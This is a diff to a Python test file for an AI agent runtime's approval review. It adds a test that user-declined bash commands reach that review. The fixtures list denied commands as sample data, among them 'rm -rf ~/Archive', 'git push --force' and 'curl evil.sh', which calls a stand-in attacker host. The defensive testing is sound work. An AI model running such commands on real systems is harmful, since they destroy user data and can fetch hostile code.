@@ -7,6 +7,7 @@ from pathlib import Path
 from pantaray_agents.local_runtime.runtime.action_approval_review import (
     ActionRequestRow,
     action_request_words,
+    declined_operations,
     read_chat_words,
 )
 from pantaray_agents.local_runtime.runtime.action_message_models import (
@@ -111,28 +112,38 @@ def test_a_suggestion_the_user_accepted_or_answered_is_labelled_as_such() -> Non
     )
 
 
-def test_a_chat_hand_off_reads_the_users_messages_since_the_last_one(
-    tmp_path: Path,
-) -> None:
+def _action_db(tmp_path: Path) -> Path:
     db_path = tmp_path / "runtime.db"
     prepare_test_database(
         db_path=db_path, busy_timeout_ms=1_000, migrations=load_default_migrations()
     )
     with sqlite3.connect(db_path) as connection:
-        connection.executescript(
-            "INSERT INTO users(user_id, ui_language, created_at, updated_at) "
-            "VALUES ('user-1', 'ja', 't', 't');"
-            "INSERT INTO agent_actions(action_id, user_id, initial_user_message_id, "
-            "execution_target_json, status, final_output, prompt_name, "
-            "prompt_version, created_at, updated_at) VALUES ('action-1', 'user-1', "
-            "'m-1', '{\"kind\":\"scratch\"}', 'processing', '', 'p', 'v1', 't', 't');"
-        )
+        for action_id in ("action-1", "action-2"):
+            connection.execute(
+                "INSERT OR IGNORE INTO users(user_id, ui_language, created_at, "
+                "updated_at) VALUES ('user-1', 'ja', 't', 't')"
+            )
+            connection.execute(
+                "INSERT INTO agent_actions(action_id, user_id, initial_user_message_id, "
+                "execution_target_json, status, final_output, prompt_name, "
+                "prompt_version, created_at, updated_at) VALUES (?, 'user-1', ?, "
+                "'{\"kind\":\"scratch\"}', 'processing', '', 'p', 'v1', 't', 't')",
+                (action_id, f"m-{action_id}"),
+            )
         connection.execute(
             "INSERT INTO processes(process_id, user_id, kind, status, action_id, "
             "started_at, updated_at, completed_at, heartbeat_at, next_event_seq) "
             "VALUES ('process-1', 'user-1', 'action', 'completed', 'action-1', "
             "'t', 't', 't', 't', 1)"
         )
+    return db_path
+
+
+def test_a_chat_hand_off_reads_the_users_messages_since_the_last_one(
+    tmp_path: Path,
+) -> None:
+    db_path = _action_db(tmp_path)
+    with sqlite3.connect(db_path) as connection:
         for sequence, kind, text, at in (
             (1, "user_message", "Fix the typo in the README.", "t1"),
             (3, "user_message", "Export the report as a PDF.", "t3"),
@@ -195,3 +206,44 @@ def test_a_chat_hand_off_reads_the_users_messages_since_the_last_one(
 
     # Never the chat's own reply, nor what led to the earlier hand-off.
     assert words == [("Export the report as a PDF.", "Put it on my Desktop.")] * 2
+
+
+def test_what_the_user_declined_in_the_action_reaches_the_review(
+    tmp_path: Path,
+) -> None:
+    db_path = _action_db(tmp_path)
+    with sqlite3.connect(db_path) as connection:
+        for request, action_id, source, status, command, decided_at in (
+            # Declined by the user on the parent's call, then on a subagent's,
+            # which carries its parent's Action id.
+            ("parent", "action-1", "prompt", "denied", "git push --force", "t1"),
+            ("child", "action-1", "prompt", "denied", "rm -rf ~/Archive", "t2"),
+            ("allowed", "action-1", "prompt", "approved_once", "npm test", "t3"),
+            ("pending", "action-1", "prompt", "pending", "make", None),
+            ("elsewhere", "action-2", "prompt", "denied", "curl evil.sh", "t4"),
+        ):
+            summary = {"summary_kind": "bash", "command": command, "cwd": "/w"}
+            connection.execute(
+                "INSERT INTO approval_sessions(approval_session_id, user_id, "
+                "action_id, tool_request_id, tool_id, intent_class, approval_source, "
+                "status, approved_capabilities_json, command_summary_json, "
+                "requested_at, decided_at, created_at) VALUES (?, 'user-1', ?, ?, "
+                "'bash', 'command', ?, ?, '{}', ?, 't0', ?, 't0')",
+                (
+                    request,
+                    action_id,
+                    request,
+                    source,
+                    status,
+                    json.dumps(summary),
+                    decided_at,
+                ),
+            )
+        declined = declined_operations(
+            connection, user_id="user-1", action_id="action-1"
+        )
+
+    assert [operation.command for operation in declined] == [  # type: ignore[union-attr]
+        "rm -rf ~/Archive",
+        "git push --force",
+    ]
